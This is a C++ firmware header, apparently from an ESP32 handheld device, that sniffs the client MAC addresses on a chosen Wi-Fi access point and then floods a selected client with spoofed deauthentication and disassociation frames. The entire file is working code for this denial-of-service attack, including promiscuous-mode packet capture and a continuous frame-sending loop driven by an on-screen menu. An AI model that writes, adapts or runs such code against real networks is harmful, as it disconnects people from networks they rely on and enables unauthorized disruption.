#pragma once
#include "../global.hpp"
#include "../menu.hpp"
#include "../display_utils.h"
#include "utils.hpp"
#include "deauth.hpp"
#include <WiFi.h>
#include <esp_wifi.h>
#include <vector>
#include <array>

static uint8_t sniffBssid[6];
static std::vector<std::array<uint8_t, 6>> sniffClients;
static volatile bool sniffing = false;

static bool macInList(const uint8_t* m) {
    for (auto& c : sniffClients) if (memcmp(c.data(), m, 6) == 0) return true;
    return false;
}

static void IRAM_ATTR sniffClientsCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
    if (!sniffing || type != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d = p->payload;
    if (p->rx_ctrl.rssi < -85) return;
    uint8_t toDs = d[1] & 0x01, fromDs = d[1] & 0x02;
    if (toDs && !fromDs && memcmp(d + 16, sniffBssid, 6) == 0) {
        if (!macInList(d + 10) && sniffClients.size() < 40) {
            std::array<uint8_t, 6> m;
            memcpy(m.data(), d + 10, 6);
            sniffClients.push_back(m);
        }
    }
}

void WiFi_DeauthClientMenu(const uint8_t* bssid, String ap_name, uint8_t chan)
{
    memcpy(sniffBssid, bssid, 6);
    sniffClients.clear();

    WiFi_InitDeauth();
    HaltTillRelease(BUTTON_CENTER);
    sniffing = true;
    esp_wifi_set_promiscuous_rx_cb(&sniffClientsCb);
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);

    unsigned long start = millis();
    while (millis() - start < 10000) {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 0);  display.print("Sniffing clients:");
        display.setCursor(0, 20); display.print(String(sniffClients.size()) + " found");
        display.setCursor(0, 40); display.print(String(10 - (millis() - start) / 1000) + "s left");
        display.setCursor(0, 56); display.print("CENTER: skip");
        display.display();
        if (ReadButton(BUTTON_CENTER)) break;
        delay(100);
    }
    sniffing = false;
    esp_wifi_set_promiscuous_rx_cb(NULL);
    HaltTillRelease(BUTTON_CENTER);

    if (sniffClients.empty()) {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 0);  display.print("No clients found");
        display.setCursor(0, 20); display.print("Deauth ALL instead");
        display.setCursor(0, 56); display.print("CENTER: ok");
        display.display();
        while (!ReadButton(BUTTON_CENTER)) delay(10);
        HaltTillRelease(BUTTON_CENTER);
        return;
    }

    Menu m;
    bool running = true;
    for (auto& c : sniffClients) {
        char s[20];
        sprintf(s, "%02X:%02X:%02X:%02X:%02X:%02X", c[0], c[1], c[2], c[3], c[4], c[5]);
        uint8_t mac[6];
        memcpy(mac, c.data(), 6);
        m.AddItem(MenuItem(String(s), [mac, bssid, chan]() {
            WiFi_InitDeauth();
            int packets = 0;
            HaltTillRelease(BUTTON_CENTER);
            while (!ReadButton(BUTTON_CENTER)) {
                WiFi_SendDeauthFrame(chan, mac, bssid, bssid, 0xC0, 0x0007);
                WiFi_SendDeauthFrame(chan, mac, bssid, bssid, 0xA0, 0x0007);
                packets += 2;
                display.clearDisplay();
                display.setTextSize(1);
                display.setCursor(0, 0);  display.print("Deauth 1 client");
                display.setCursor(0, 16); display.print("Packets: "); display.print(packets);
                display.setCursor(0, 56); display.print("CENTER: stop");
                display.display();
                delay(10);
            }
            esp_wifi_set_promiscuous(false);
            HaltTillRelease(BUTTON_CENTER);
        }));
    }
    m.AddItem(MenuItem("[Back]", [&](){ running = false; }));
    m.Revive();
    while (running) { m.HandleButtons(); m.Render(); }
}
